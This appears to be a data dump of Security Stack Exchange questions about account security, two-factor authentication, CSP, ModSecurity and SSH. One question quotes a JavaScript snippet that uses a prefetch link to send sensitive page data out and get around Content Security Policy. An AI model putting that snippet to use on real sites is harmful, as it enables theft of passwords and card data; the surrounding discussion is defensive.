","167426","","","","","2018-01-05 02:47:45","Does Yandex browser have known records of snooping for user data & passwords?","<privacy><web-browser><data-leakage><account-security><user-tracking>","2","4","","","","CC BY-SA 3.0"
"176561","1","176877","","2018-01-03 07:19:10","","0","375","<p>My question is how is it possible to know if I am reusing a password? Are they storing my old password as well [in plaintext]?</p>

<p>If an admin had access to the backend, wouldn't they have access to all my passwords?</p>

<p>What is the point of that much security?</p>
","167444","","36538","","2018-01-06 02:56:31","2018-01-06 03:16:49","How do authentication system know if I am reusing a password? How is this secure?","<account-security><password-reset>","1","2","","","","CC BY-SA 3.0"
"176626","1","176627","","2018-01-04 01:25:23","","86","7784","<h2><strong>From the Linux Bible, edition 9:</strong></h2>

<blockquote>
  <p>Files that are not assigned to any username are considered to be a security risk.</p>
</blockquote>

<p>How is this possible and how could this be exploited?</p>

<p>Edit:My question isn't a duplicate of the mentioned question because my question is focused on the user creation process instead of focusing on the least privilege principle.</p>
","127671","","127671","","2018-01-06 05:33:00","2018-01-06 05:33:00","Why are files that are not assigned to a user considered a security risk?","<linux><account-security>","1","3","","2018-01-06 15:35:30","","CC BY-SA 3.0"
"245505","1","","","2021-02-28 17:14:01","","1","108","<p>I've been receiving a lot of email lately intended for &quot;Daniel L...&quot;, a person with the same last name and same first initial as me. It appears this person has requested information from dozens of colleges, car rentals, business opportunities, etc; and had all the information sent to my email address. I have a short, basic email address so this has happened before but not nearly to this extent. In previous cases, it was nothing malicious; most likely the person either entered the wrong email address in a form, or perhaps didn't actually didn't want to provide their own actual email in that scenario for whatever reason.</p>
<p>In these recent cases with &quot;Daniel&quot; however, I am perplexed what the explanation could be. Clearly he couldn't have mistakenly entered my email while legitimately requesting information from so many colleges and other places. Again, to reiterate, it appears &quot;Daniel&quot; has entered my email in many, <strong>probably 50-100 different websites requesting information</strong>. He would not have actually received any of that requested information.</p>
<p><strong>Is this behavior consistent with any well-know scams related to trying to takeover a particular email account, especially a highly desirable (aka &quot;og&quot; address)?</strong> Perhaps he is playing a long con, and thinks he is building a case to show he is the rightful owner of the email address?</p>
<p>For example, maybe he intends to go to the email domain owner and say something like, &quot;look I know this email address has received these exact hundred emails over the past year, this proves it should be turned over to me&quot;??? It seems very flimsy, but I just wanted to make sure this isn't some scam I am not aware of.</p>
","21401","","21401","","2021-03-01 17:41:53","2021-03-01 17:41:53","Email Takeover Scam?","<email><account-security><spam><scam>","0","4","","2021-02-28 18:14:16","","CC BY-SA 4.0"
"245552","1","","","2021-03-01 21:36:14","","1","723","<p>Yes, I did read this answer: <a href=""https://apple.stackexchange.com/questions/192365/is-it-ok-to-use-the-root-user-as-a-normal-user/192422#192422"">https://apple.stackexchange.com/questions/192365/is-it-ok-to-use-the-root-user-as-a-normal-user/192422#192422</a></p>
<p>But I still fail to understand the reasoning behind this advice, <strong>as long as we are talking about a single user home PC</strong> (for a multi-user system the advice seems obvious to me: a maliocious or compromised user must not be allowed to adversely affect other users)</p>
<p>As far as I'm aware the advice against running root all the time falls in two categories:\</p>
<p><strong>1. Security: If I get compromised the attacker will do less damage if they're not able to gain root privileges</strong></p>
<p>Will they? Even without root they can: Encrypt my data and demanding ransom; connect my computer to a botnet and mount a ddos attack against a legitimate site; connect my computer to a botnet and use it to ditribute illegal materials, prompting Men in Black to knock my doors; unless im mistaken, set up a keylogger; steal my browser profile and gain access to my email account I'm logged to at the moment.</p>
<p>Might I ask in what ways can they screw me up that actually requires them to gain root?</p>
<p>Because it seems it pretty much does not matter if I'm root or not...</p>
<p>Obligatory xkcd: <a href=""https://xkcd.com/1200/"" rel=""nofollow noreferrer"">https://xkcd.com/1200/</a></p>
<p><strong>2. Accidental mistakes such as issuing <code>rm -rf</code> against a system critical directory</strong></p>
<p>Once again: Without root I may not be able to accidentally remove or corrupt <code>/etc</code> or <code>/bin</code> or <code>/usr</code>, but I'm still able to accidentally remove or corrupt my data in <code>/home</code>. The latter is arguably worse than the former: the former can be fixed by OS reinstallation, but the latter requires me to have recent backups, or else I cannot recover.</p>
<p>So, with root or without root, I still have to pay utmost care when I issue dangerous commands such as <code>rm</code>.</p>
<p>In light of the above, may I ask why is it recommended to not use root for everyday use?</p>
","108649","","","","","2021-03-29 22:38:03","Why is it not recommended to permanently use the root account for all tasks?","<account-security><defense><privileged-account><root><principle-of-least-privilege>","3","4","","","","CC BY-SA 4.0"
"245612","1","","","2021-03-03 09:05:23","","1","1842","<p>Many sites have a step during registration when you have to create security questions and answers for them. Is this type of security layer considered as 2FA? From what I know, 2FA is used for the purpose of typing in data which is not permanent, like SMS message which comes to you when you are logging in. You don't know it before it comes. So, is answering remembered security questions is 2FA according to 2FA principles and the framework of security questions?</p>
","251140","","6253","","2021-03-03 11:59:46","2021-03-05 09:21:10","Are security questions considered as 2FA?","<authentication><passwords><account-security><multi-factor><secret-questions>","3","1","","","","CC BY-SA 4.0"
"109081","1","109084","","2015-12-27 18:30:40","","5","241","<p>I have a relatively critical control-panel online. If someone with malicious intent were to log in, there would be a significant risk to property. I will be hosting said site on Google App Engine, everything will be through SSL, and have a proper password system with random hashes.</p>

<p>Now, looking through app-engine questions on SO.SE, I found <a href=""https://stackoverflow.com/a/4998365/2179570"">this answer</a> that indicates that it would be best not to deal with passwords at all, and instead use Google Accounts login.</p>

<p>What are the pros and cons of using Google accounts v. managing my own password database? </p>
","95410","","-1","","2017-05-23 11:33:39","2015-12-27 19:06:54","Should I use Google Accounts or my own hashed password system?","<password-management><account-security>","1","0","","","","CC BY-SA 3.0"
"176950","1","","","2018-01-07 08:24:42","","4","801","<p>Assume the following scenario and please correct me if I am wrong somewhere:</p>

<p>There is a client and there is an SSH server that the client connects to. There is also a man-in-the-middle (MIM) which is able to intercept the client's incoming and outgoing traffic.</p>

<p>Now suppose that the client connects to the SSH server for the very first time and the server's public key info is not in the known_hosts file yet. The server sends its public key to the client, the client checks known_hosts file, does not find the server's public key there and hence the server now needs to prove its identity to the client. Identity is successfully proven (by using server's private key), but suppose that the client does not store the server's public key in the known_hosts after that (it is not mandatory to store it in the known_hosts, as far as I know).</p>

<p>The next time when client connects to the SSH server, the man-in-the-middle (MIM) intercepts client's connection request, and sends its own public key to the client, on behalf of the real SSH server. The client receives MIM's public key, inspects known_hosts file, and does not find the received public key in that file, so the ""server"" (MIM) needs to prove its identity again. Because the MIM's public key is associated with the corresponding private key, MIM successfully proves its identity to the client.</p>

<p>Is it possible to compromise security in that way? Correct me if I'm wrong somewhere please.</p>

<p>Someone told me that the server domain certificate is able to solve the problem, so additionally I would like to understand the purpose of host certificates. I have read that the certificate is put into known_hosts file just as the usual public key. But what's the point of using a certificate if we may use the same public key on all servers in domain, and simply put that public key into client's known_hosts file?
Apparently, if there's no public key in known_hosts yet, the attack I've described above is still possible, and it doesn't matter whether the server uses certificate or not.</p>
","167859","","","","","2018-12-03 07:09:25","SSH and man-in-the-middle","<ssh><server><account-security><openssh><client>","1","0","","","","CC BY-SA 3.0"
"176958","1","","","2018-01-07 11:16:10","","1","2583","<p>I understand that an ISP has the ability to monitor a user's Internet browsing history, but do they actually do it without a subpoena/court order? And if they do, does the user's history look exactly how the history tab in Chrome looks, or is it categorized by site/date/something else</p>
","158113","","","","","2018-01-07 12:10:34","Does an ISP monitor user browsing history without a subpoena?","<account-security><internet>","1","3","","2018-01-10 00:21:00","","CC BY-SA 3.0"
"245780","1","","","2021-03-07 13:39:27","","1","271","<p>Is there a place I can view modsec rules?</p>
<p>Trying to save some javascipt &amp; html code through elementor on wordpress triggered some modsec rule. Specifically:</p>
<p><code>[file &quot;/etc/apache2/conf.d/modsec/modsec/11_asl_adv_rules.conf&quot;] [line &quot;117&quot;] [id &quot;331028&quot;] [rev &quot;13&quot;] [msg &quot;Atomicorp.com WAF Rules:  Unauthorized SQL access to database Detected.&quot;]</code></p>
<p>I want to see what in my html&amp;JS triggered this rule, but the log I was sent from the hosting company only lists part of the regular expression (and I do not have access to said file).</p>
<p>Is the above list available anywhere? or can someone tell me what the full regexp is for this rule?</p>
","1453","","6253","","2021-03-07 14:21:31","2021-03-07 14:21:31","regexp of a modsec rule","<mod-security>","0","4","","","","CC BY-SA 4.0"
"177024","1","","","2018-01-08 02:12:20","","5","1143","<p>The article <a href=""https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5"" rel=""nofollow noreferrer"">I’m harvesting credit card numbers and passwords from your site. Here’s how.</a> describes the phases of a theoretical attack where an attacker can bypass a strict CSP and exfiltrate sensitive information. The article claims that this script can bypass CSP:</p>

<pre><code>const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
</code></pre>

<p>This takes advantage of the fact that <code>prefetch</code> behavior in the CSP standard is underspecified. In Chrome, this works, but Firefox currently prevents this from happening (which may change given user complaints in the bug report). The article claims that this works even with the strictest security policy:</p>

<pre><code>Content-Security-Policy: default-src 'none'; script-src 'self'
</code></pre>

<p>Which is true because there is no fallback behavior for <code>prefetch</code> currently. However, the thing not addressed is that the attacker's code still has to be injected (out-of-line) somehow. The article <a href=""https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/"" rel=""nofollow noreferrer"">""Bypassing Content-Security-Policy with DNS prefetching""</a> suggests that this is done by finding an XSS vulnerability elsewhere.</p>

<p>Assuming that the target website uses HSTS and that a user visiting the website uses NoScript, what would such an attack vector look like?</p>
","167921","","16960","","2018-01-10 00:14:23","2018-01-10 00:14:23","XSS vulnerability with strict CSP","<xss><content-security-policy>","1","2","","","","CC BY-SA 3.0"
"177079","1","211345","","2018-01-08 17:02:44","","3","254","<p>In windows, there are <strong>service</strong> accounts like <strong><em>HOSTNAME\IUSR</em></strong> which are able to run certain processes (IIS in this case). Are these accounts vulnerable to being broken into and starting a remote shell (for instance)?</p>

<p>What is different from these accounts than your average user account? Can you login as a service account? Do you have to be able to login to create a shell?</p>
","123700","","","","","2019-06-05 04:53:23","Can you start a shell with a service account in Windows?","<windows><account-security><shellcode><iis>","1","0","","","","CC BY-SA 3.0"
"177082","1","","","2018-01-08 17:15:03","","1","160","<p>Many games and websites have an explicit policy that the owner of the account is fully responsible for any and all activity from that account and therefore suspensions will not be shortened or removed even if the activity the account was suspended for had been perpetrated by a hacker while he had been illegitimately accessing the account. (Wikipedia is among important exceptions here, though).</p>

<p>This opens up an attack vector to pemanently strip the legitimate account owner of their account. If a hacker simply changes the password of the account, the account may still be reclaimed by its legitimate owner with the help of the site or game's support. However, if the hacker purposefuly perpetrates a serious violation of the site or game's ToS and consequently the account gets permabanned, then the account owner will never be able to use this account again. Apparently, this does happen in practice (<a href=""https://i.stack.imgur.com/gB18v.jpg"" rel=""nofollow noreferrer"">example 1</a>, <a href=""https://boards.euw.leagueoflegends.com/en/c/help-support-en/8YjxR8Mo-account-hacked-who-got-me-permabanned"" rel=""nofollow noreferrer"">example 2</a>).</p>

<p>What I find perplexing is that these same games, who refuse to lift bans issued for hackers' misdeeds, still provide facilities for account recovery. They even encourage to contact support if the standard recovery facilities (e-mail) fail (example: <a href=""https://support.riotgames.com/hc/en-us/articles/201751694-Recovering-Your-Account"" rel=""nofollow noreferrer"">this</a> vs <a href=""https://support.riotgames.com/hc/en-us/articles/201898070"" rel=""nofollow noreferrer"">this</a>).</p>

<p>Therefore, may I have two questions?</p>

<ol>
<li>Does the policy not to lift bans issued for hackers' behaviours arise from the difficulty of determining whether the account was indeed hacked?</li>
<li>If the above is true, is it more difficult to determine whether the account was used by its legitimate owner on a given occasion than who is the legitimate owner and whether its current user is the legimitate owner (since support does trouble itself with account recovery)?</li>
</ol>

<p>BTW: Since I used the case of LoL to provide examples: A disclaimer to keep my conscience clear of an accidental misrepresentation of facts: I have feeling that regardless of the official policies LoL support sometimes does lift such bans, though I'm not certain of that.</p>
","108649","","","","","2018-01-08 22:57:10","How difficult is it to determine whether an account got hacked or why do games allow account recovery while refusing to lift bans for hackers' deeds?","<account-security>","1","2","","2018-01-08 21:38:30","","CC BY-SA 3.0"
"245934","1","","","2021-03-10 14:31:08","","2","316","<p>My agency (which isn't a high security-risk, top-secret place) has an almost zero tolerance rule for Zoom and I am curious why.  We are told to use WebEx instead but I fail to see why WebEx is more secure than Zoom.  I don't think it's merely an E2E encryption issue because we are allowed to use the web-based version of Zoom but not the app.  This is a rather annoying policy largely because all of our collaborators use/rely on Zoom and the web-based version is at best kludgy.</p>
<p>Other agencies and labs that <em>are</em> high security-risk (e.g., military contracts and security clearance requirements) have .gov Zoom accounts and seem fine with it.  So my inclination is to think this is just our OCIO over reacting or somehow that we don't have a contract with Zoom prevents its use.  However, they repeatedly send out alerts about how big of a threat Zoom is to IT security yet they never explain why.</p>
<p>So why is the Zoom app viewed as a security threat?</p>
","123782","","","","","2021-03-11 19:00:24","What precisely about Zoom is not secure?","<web-application><account-security><threat-mitigation>","1","12","","2021-03-11 19:09:56","","CC BY-SA 4.0"
"177159","1","","","2018-01-09 12:54:07","","1","120","<p>In the midst of using a popular online service the other day, I noticed some curious activity. My usage was diverted - while I was interacting with the service - into activities that were not (and would not have been) of my choosing. This access was registered as coming from an iPhone, and I don't own such a device. The activity made some (free) additions to my account. </p>

<p>At first I had no idea what was going on - I thought it might be a family member using an iPhone and ""borrowing"" my credentials. It took some hours to establish that it was not, by which time the suspicious activity had ceased, although the changes made remained. I accessed this service using my Facebook credentials. To be sure, I then logged out of both the service in question and Facebook and changed both passwords to strong, unique ones.</p>

<p>I have contacted the service provider, who has told me that ""another user"" gained access to my account and that I did the right thing to change my password. They refused to divulge any further details. </p>

<p>However, this breach seems unlikely to have been malicious due to the pattern of behaviour. Specifically:</p>

<ul>
<li>There was no attempt to change the password or email associated with the account.  </li>
<li>There was no attempt to use the payment access on the account to purchase anything.  </li>
<li>Access to the account was via Facebook, and there was no attempt to change my email or password there either, nor was there any suspicious activity there at all.  </li>
<li>A third service was linked to the suspicious one, which records my activity there. None of the suspicious activity was recorded, which is most peculiar.</li>
<li>The suspicious activity ceased of its own accord some hours before I changed the passwords.</li>
</ul>

<p>So there are two possible options here. Either someone got my password for this account or this service has a security flaw that can lead to shared data and activity between accounts. Obviously, either is alarming and I'd like to know which one it is. </p>

<p>Can the lack of malicious actions taken during the breach be taken as any indication that it was not a deliberate hacking attempt? What other possible reason would there be to make non-malicious use of someone else's account in a non-social/public service?</p>
","52575","","52575","","2018-01-09 13:10:56","2018-01-09 13:10:56","Is non-malicious unauthorised usage likely to suggest a security compromise?","<account-security>","1","0","","","","CC BY-SA 3.0"
"177164","1","","","2018-01-09 14:28:19","","0","102","<p>List of user:hash published? Same password for web and local (os...)? 
Phishing? </p>
","163179","","","","","2018-01-09 15:15:10","What are the most frequent ways someone's password ""leaks""?","<passwords><account-security>","1","9","","2018-01-09 16:19:06","","CC BY-SA 3.0"
"177193","1","","","2018-01-09 19:54:54","","1","1101","<p>I am wondering what the difference is between WhatsApp and my Bank application, and what considerations determine what is the right approach to handle user authentication.</p>

<p>WhatsApp:</p>

<ul>
<li>I create my account and don't have to login again</li>
<li>I change phone but keep my old number (same chip)</li>
<li>WhatsApp sends me a code because it is the same number and my account is active again</li>
<li>If my wife/girlfriend/mother/coworker gets the phone, they can see the conversations</li>
</ul>

<p>BankApp:</p>

<ul>
<li>I have to register and create an account with a login/password and use my card number to validate who I am</li>
<li>They send me an activation link to my email</li>
<li>I have to enter my login and password every time</li>
<li>I get logged out after 5 minutes of inactivity</li>
<li>If a thief points a gun at you, you still will give away the password</li>
</ul>

<p>I'm developing a tracking app and my first thought was to create a login form so user needs to enter the login/password each time but now I think it is too cumbersome for user. Then I realized WhatsApp never asks me for anything and is always running when I start the phone. </p>

<p>So my approach now is such that the login page only appears once. The user inputs his login and if he is already register on the system, he gets the activation code. The app starts and doesn't ask for login again. The app also sends the ESN number to prove identity.</p>

<p>It is easy to use, but still has a problem if someone gets access to your phone, because they can know where are you been.</p>

<p>But again if they have access to your phone they can browse other things like your Google activity and that seem to be OK because you don't need to enter your password to open Google. </p>

<p>So When is it OK to have a system like WhatsApp, and when a more robust security like the Bank?</p>
","168095","","106285","","2018-04-10 01:16:21","2019-12-31 16:08:50","In what cases is it ok keep a user logged in or provide auto login if an app starts?","<authentication><account-security>","2","1","","","","CC BY-SA 3.0"
"177305","1","177312","","2018-01-11 05:12:29","","0","615","<p>Can the software ModSecurity defend from Brute Force Attacks on PHPmyadmin and WordPress as well?</p>

<p>A particular hosting company providing shared hosting told me that ModSecurity should cover PHPmyadmin and WordPress as well as their Admin area and Cpanel area.</p>

<p>Does it sound plausible to you?</p>
","163878","","","","","2019-07-17 01:54:26","Can ModSecurity defend from Brute Force Attacks on PHPmyadmin and WordPress as well?","<linux><brute-force><apache><mod-security><phpmyadmin>","3","0","","","","CC BY-SA 3.0"
"246139","1","","","2021-03-15 05:52:10","","1","280","<p>I'm bit confused about this security flaw. I'm in real need of help in this :smile:
My express code (not using any sessions, just <code>cookie-parser</code>)</p>
<pre><code>app.get(&quot;/signin&quot;, (req, res) =&gt; {
    if(!req.query.token) return res.status(403).json({status:403, message:&quot;Authorization Required&quot;});
    let options = {maxAge: 1000 * 604800,httpOnly: true,signed: true,secure: true};
    res.cookie('token', encryptor.encrypt(req.query.token) , options);
    res.status(200).json({status:200, message:&quot;Success&quot;});
});
app.get('/data', (req.res) =&gt; {
     let cookie = encryptor.decrypt(req.signedCookies.token);
     db.fetch(cookie).then(data =&gt; res.json(data));
})
</code></pre>
<p>So here, let's say 'A' &amp; 'B' sents sign-in request with a token. The express app should encrypt them and send them in an httpOnly cookie.
Yesterday, 'B' logged in first, pulls his data. After that, 'A' logs in &amp; pulls his data. But right after that, when 'B' again tries to pull his data, he receives 'A's data, which indicates that the request which 'B' sent had the cookie which belongs to 'A'. I don't understand how or why it changed. I thought httpOnly cookies arent domain-wise but user-wise. (Both of the users logged in &amp; pulled the data using a web app in the same domain)</p>
<p><strong>EDIT:</strong><br />
After new tests, I was able to find out that, after the very first request, every following request are responded with <code>304</code> status code. That means express is sending the cache along with the token. Thats a huge security flaw here since each user data is obtained by his or her token.<br />
Here is another example of what I think is happening:<br />
Users 'A' &amp; 'B'<br />
'A' sents login request first and 'A' receives his encrypted cookie back.
Next, 'B' sends a login request &amp; due to 304, receives 'A's cookie.</p>
","252774","","252774","","2021-03-15 10:37:27","2021-03-15 10:37:27","httpOnly Cookie Security Flaw","<authentication><cookies><account-security><node.js>","0","6","","","","CC BY-SA 4.0"
"246158","1","","","2021-03-15 14:58:51","","1","1170","<p>Nowadays, many Password managers offer options for 2-Factor Authentication such as TOTP. I am really confused regarding this. Isn't the whole point of 2FA is to prove you have a second way of proving your identity?</p>
<p>What kind of security risks would I have if I have both my passwords and 2FA within the same app compared to having them in different separate apps? Does having them within a single app pose any significant risk?</p>
","110612","","110612","","2021-03-15 15:10:41","2021-03-15 15:10:41","Is it safe to use 2FA within a password manager relative to using a separate app for 2FA?","<password-management><account-security><multi-factor>","1","3","","2021-03-16 03:44:57","","CC BY-SA 4.0"
"246350","1","","","2021-03-19 11:26:43","","0","185","<p>Currently there is this design of two apps that work together:</p>
<ol>
<li><strong>Proof app</strong>: On customers phone, takes in a textcode and creates a QR code</li>
<li><strong>Scanner app</strong>: On hosts phone, Scans the QR code and displays some information like birthday, initial and valid date. Does not connect to the internet for this.</li>
</ol>
<p>Both applications will be open source.</p>
<p>My question:
Is there a fundamentally solid way to avoid people from generating a false QR code, for instance with a different birthday, initial or valid date?</p>
<p>We may assume that the consumer can build a new app based on the source code of both apps. However, we may also assume they do not have access to a textcode that would give the normal app the desired QR code.</p>
<hr />
<p>My thoughts so far:</p>
<ol>
<li>Obviously we cannot prevent the user from altering the QR code, but perhaps we can make sure he cannot alter it into something useful.</li>
<li>To deter brute forcing, presumably the QR code should contain one 'output' which gets translated in the scanner app to the various pieces of information. (Opposed to having each individual property translated separately).</li>
<li>I don't think this is possible: perhaps if the QR code and text code are complex enough then even with full knowledge of the code brute forcing approaches would be impractical, but how can you prevent general reverse engineering?</li>
</ol>
<p>If it is not possible to avoid this for a single individual who is willing to make an effort, would it conceptually still be possible to prevent at least a cracked app which is distributed to the public easily?</p>
","15756","","","","","2021-08-16 12:07:00","Can we prevent users from generating a QR code with edited information","<authorization><identification><qr-code><security-by-design>","1","5","","","","CC BY-SA 4.0"
"246411","1","","","2021-03-21 12:35:11","","1","119","<p>Over the years I've received the occasional password reset from a service I've never used (or even heard of sometimes). As far as I can tell, the emails are genuinely being generated and sent by the service. Still, I always ignore them.</p>
<p>But, more recently, this has been ramping up, to the point where I recevied <em>dozens</em> of password reset emails from Apple within a few hours. I do have and have never had an account with any of Apple's services.</p>
<p>So, <em>why</em> am I getting these? Is this some kind of attack? What is the aim/goal of this? Is there anything I can do about this, or should I just continue to ignore all of it?</p>
","253146","","","","","2021-03-21 12:35:11","Why do I receive so many password reset/welcome emails from services I'm not a customer of?","<password-management><account-security><multi-factor>","0","5","","2021-04-06 14:44:23","","CC BY-SA 4.0"
"246418","1","","","2021-03-21 19:42:24","","2","1152","<h3>Background</h3>
<p>I have a &quot;main&quot; Gmail account, which I set to keep logged in, on my laptop. This &quot;main&quot; Gmail account is important, because it's the email address I used to sign up for many other services (and, so, if I forget my password on these other services, I get the password reset link sent to this Gmail account).</p>
<p>I have a phone. I do not keep myself logged into my main Gmail account on my phone. I rarely log into my main Gmail account on my phone; but whenever I do, I only stay logged on for a few minutes, and then I log back out.</p>
<p>I have a secondary Gmail account, which I list as a recovery email address for my &quot;main&quot; Gmail account. My secondary Gmail account's password is written in a safe physical place (not in my wallet or backpack). I rarely log into this secondary account. (This secondary email has my phone number as a recovery phone number, but as I explain below, I'm thinking that this might be unsafe?).</p>
<h3>Is it better to not use a recovery phone number?</h3>
<p>My main concern is to keep my &quot;main&quot; Gmail account secure, even if I lose my laptop and my phone at the same time. (I tend to keep both in my backpack, instead of keeping my phone in my pocket).</p>
<p>Is it a bad idea add to my phone number as a recovery phone number to my &quot;main&quot; Gmail account?</p>
<p>That is, I'm thinking it would be a bad idea, because if I lost my backpack, then anyone who found my backpack could gain permanent access to my Gmail account in a way that I could not prevent:</p>
<ul>
<li><p>even if I act quickly and use a different device (ie, one that I didn't lose) to force my main account to log off of the stolen laptop, the person who found my backpack would still see that my main Gmail account is used on this laptop (ie because when they open up google, they see google accounts &quot;added&quot; to the Chrome browser as account options for logging in). Then, they could use my phone to &quot;recover&quot; my main Gmail account.</p>
</li>
<li><p>and then, even if I use my secondary Gmail account as a recovery option for my main Gmail account, I'm thinking that the attacker owning my phone to &quot;recover&quot; my main Gmail account would trump me using my secondary Gmail account to recover my main Gmail account.</p>
</li>
</ul>
<p>However, I'm thinking that it's harder for an attacker if I have no recovery phone number on my main Gmail account. Then, in order to get access to my main account, the attacker would first need to get access to my secondary account using my phone.</p>
<p>And finally, I'm thinking that if I have no recovery phone number on either account, then my main account is safe from an attacker, even if they have both my phone and my laptop.</p>
<h3>Question</h3>
<p>What is the best plan for me to protect my main Gmail account, even if I lose both my laptop and my phone?</p>
<ul>
<li>Is the best plan to not have a recovery phone number on either my main or secondary Gmail account? (ie, is it true that if I choose this option, then an attacker could not get permanent access to my main Gmail account, even if they owned my lost laptop and lost phone?) What are the drawbacks of this plan? What other plans might I consider?</li>
</ul>
","253131","","71850","","2021-03-21 20:20:30","2023-08-09 06:02:55","Does adding a recovery phone number to a Gmail account make it less secure, in the case that I lose both my laptop and phone?","<account-security><gmail>","1","0","","","","CC BY-SA 4.0"
"109828","1","109835","","2016-01-05 19:30:33","","12","1693","<p>The <a href=""https://en.wikipedia.org/wiki/Steam_%28software%29"">Steam platform</a> is designed to encourage users to use two-factor authentication.  One of the community tasks (achievement-like objectives) on Steam is ""Use the Steam Mobile App for two-factor authentication"".  This is visible on public profiles for anyone.</p>

<p>This could let possible hackers quickly find out whether an account uses two-factor authentication, letting them choose targets more efficiently.</p>

<p>Should people be concerned about this security risk?  Should it be reported to Valve?  Or is it harmless?</p>

<p>Doesn't this feature completely undermine the purpose of 2FA as hackers would simply avoid accounts with it and choose other accounts that are valuable targets without 2FA?</p>
","","user95883","971","","2016-01-06 00:13:05","2016-01-06 00:19:45","Steam and two-factor authentication","<authentication><known-vulnerabilities><multi-factor><account-security>","3","9","","","","CC BY-SA 3.0"
"177654","1","177656","","2018-01-15 18:56:11","","76","30405","<p>My new girocard did not reach me. I wanted to call the bank to block the old and get a new one. So I checked my online banking and found a phone number (""Block card: girocard or visa card lost? Call 04106-...). I called said number, and I talked to a real person. So far, so good. The person wanted my Online-Banking PIN, through the phone, before doing anything.</p>

<p>Is this normal and safe operation, or was I correct to politely end the conversation?</p>

<p>What happens if my card is misused after tomorrow? I called their hotline to get it blocked, but they didn't want to do anything without my online banking PIN.</p>
","37853","","101874","","2018-01-16 16:13:16","2018-01-17 19:22:40","Bank wants my Online-banking PIN through the telephone","<account-security><banks>","10","21","","","","CC BY-SA 3.0"
"177677","1","","","2018-01-15 23:05:08","","0","127","<p>So around December 12th my home network got taken over. I had the default password set and never changed the ssid. Anyway now I don't know what to do. I can't access the web interface of my router so I bought a new one but I can't set that up without interference. Even when I disable all of my network drivers I have an external IP show up. I can't do anything without being under the microscope. </p>
","168542","","","","","2018-01-15 23:13:12","I've been hacked now how do I recover","<network><windows><account-security>","1","2","","2018-01-15 23:19:10","","CC BY-SA 3.0"
"177694","1","","","2018-01-16 09:19:24","","0","3877","<p>I am traveling long term and I don't want to put my SIM card in the phone every month to receive the SMS code when signing-in to Google (I always recieve 10+ other text messages which costs me a lot).</p>

<p>I know you can sign-in using backup codes but I just can't find them anywhere. I checked <a href=""https://myaccount.google.com/u/1/security"" rel=""nofollow noreferrer"">https://myaccount.google.com/u/1/security</a> thorougly.</p>

<p>Is this option now obsolete? Google's <a href=""https://support.google.com/accounts/answer/1187538?hl=en"" rel=""nofollow noreferrer"">answer</a> on how to obtain them is definately obsolete.</p>
","49787","","","","","2018-01-16 11:00:51","Where can I find Google Backup Codes?","<google><multi-factor><account-security>","2","1","","2018-01-16 11:53:29","","CC BY-SA 3.0"
"246461","1","246463","","2021-03-22 18:40:47","","1","965","<p>This may already have been answered, but I'm having difficulty understanding the technical jargon of various posts.
I have to give a Callback URL to receive some sort of validation, to use an API. Does providing my localhost url (https://...), make it possible for someone on the other end (e.g. the people that run the API) to get into my computer? Also, am I able to provide the localhost url whilst using a VPN? Thanks and apologies for the simpleton nature of this post:)</p>
","253107","","","","","2021-03-22 19:42:07","Noob question on security of localhost","<network><account-security><content-security-policy>","2","2","","","","CC BY-SA 4.0"
"177774","1","","","2018-01-17 01:41:24","","0","430","<p>You can use Content Security Policy to disallow style attributes, but you can just get around this just by using javascript to modify an element's style. Isn't this a security hole or am I missing something?</p>
","121332","","","","","2018-01-17 06:26:20","Why doesn't CSP block JS from modifying an element's style?","<javascript><content-security-policy><css>","3","0","","","","CC BY-SA 3.0"
"246607","1","246610","","2021-03-25 15:58:14","","0","510","<p>I would like to know peoples' thoughts as to whether a WAF is a perfectly acceptable compensating/alternative control to things like CSP, X-XSS-Protection, etc. I know WAF is suppose to protect against XSS and etc, but I been using Mozilla Observatory to rate sites and want to know if a WAF should be taken into consideration for the areas Observatory considers.
<a href=""https://observatory.mozilla.org/analyze/secure.verizon.com"" rel=""nofollow noreferrer"">https://observatory.mozilla.org/analyze/secure.verizon.com</a></p>
","234904","","234904","","2021-03-25 16:18:19","2021-03-25 16:25:38","Validity of a WAF as a Compensating/Alternative Control for CSP, X-XSS-Protection, etc","<web-application><xss><content-security-policy><waf>","1","0","","2021-04-16 18:32:35","","CC BY-SA 4.0"
"247668","1","247669","","2021-03-27 19:45:06","","0","174","<p>You may think I'm crazy, that's why I'm here to ask. <a href=""https://digdeeper.neocities.org/ghost/browsers.html"" rel=""nofollow noreferrer"">I read this page</a> which went over the privacy and security of many if not all browsers.</p>
<p>From his reporting, and my own logic, that the government likely has advanced enough tracking tech that no-browser on the market can escape the honeypot/tracking, I reason that using google chrome may be the safest avenue: Why? Because the larger the crowed, the less attention each user is given, and thus the greater privacy you get.</p>
<p><strong>Should I make the switch back to chrome from Brave?</strong></p>
","254520","","","","","2021-03-27 20:05:14","Google Chrome, the best bet for online privacy?","<web-application><privacy><web-browser><account-security><web>","1","0","","2021-03-28 07:04:43","","CC BY-SA 4.0"
"177867","1","","","2018-01-18 04:23:42","","1","324","<p>Do solutions exist for forwarding SMS messages whereby:</p>

<ul>
<li>the service provider stores no logs of messages</li>
<li>login protection with google authenticator or comparable</li>
</ul>
","168756","","6253","","2018-01-18 11:11:51","2018-01-18 11:11:51","Secure forwarding of 2FA SMS codes","<mobile><account-security><sms>","1","0","","2018-01-29 12:14:59","","CC BY-SA 3.0"
"247830","1","","","2021-04-01 14:23:09","","2","1295","<p>What would be an example of a CSP script-src-elem directive allowing a script to be loaded but a script-src-attr directive preventing a function in that script from being executed? If you don't want the js handlers to be executed, why not just prevent the js from being loaded in the first place? I could understand the usefulness of script-src-attr if it operated at the function level, but that is not the case, is it?</p>
","248937","","","","","2021-07-19 18:00:40","Example of script-src-attr that is not already handled by script-src-elem","<javascript><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"177995","1","","","2018-01-19 18:58:25","","2","136","<p>Let's say I have a secret integer X, and so I don't risk losing it, I store it encrypted on some cloud service.  But I think there's a small probability that it gets hacked.  So to help allay those fears, I generate a random number R, and store X+R on the cloud, and R on some other cloud service.  It <em>seems</em> like I should feel more secure, since a hacker cannot do anything with X+R alone, or R alone.  Is this right?</p>

<p>PS: I guess I have also increased my chance of losing my data (roughly doubled).  But it seems like probability of someone figuring out X has probably decreased by a much greater fraction (1/P) than this doubling.</p>
